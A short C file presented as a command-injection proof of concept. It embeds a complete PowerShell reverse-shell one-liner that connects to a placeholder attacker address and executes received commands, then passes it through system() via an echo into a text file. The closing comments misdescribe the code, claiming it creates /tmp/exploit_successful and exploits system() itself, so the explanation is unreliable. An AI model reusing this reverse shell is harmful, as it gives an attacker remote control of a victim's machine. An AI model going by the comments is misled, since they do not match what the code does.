#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE 1024

int main() {
  char *filename = "vulnerable_file.txt";
  char *malicious_command = "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker_ip_address',attacker_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  =$sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";

  char buffer[BUFFER_SIZE];
  memset(buffer, 0, BUFFER_SIZE);

  sprintf(buffer, "echo \"%s\" >> %s", malicious_command, filename);

  system(buffer);

  return 0;
}
// This POC takes advantage of a command injection vulnerability present in the system() function in C, which allows an attacker to inject arbitrary commands by appending them to the end of the original command. 
// In this case, the attacker appends a command to create a file named /tmp/exploit_successful to a file named vulnerable_file.txt.

// this POC is for educational purposes only and should not be used for any malicious activities.
